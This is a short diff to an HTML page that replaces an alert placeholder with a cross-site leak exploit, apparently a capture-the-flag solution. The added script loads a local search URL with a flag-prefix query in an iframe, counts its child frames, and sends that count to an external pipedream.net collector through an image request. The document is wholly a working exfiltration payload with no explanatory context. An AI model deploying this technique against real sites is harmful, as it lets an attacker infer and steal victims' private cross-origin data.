@@ -1,5 +1,9 @@
 <iframe id="iframe"></iframe>
 <img id="img">
 <script>
-	alert(2);
+	const iframe = document.getElementById("iframe");
+	iframe.src = "http://localhost:8000/search?query=DH{";
+	iframe.onload = () => {
+	    img.src = `https://802781d2f26fac5407cec5c54b18ef91.m.pipedream.net/${iframe.contentWindow.frames.length}`;
+	};
 </script>
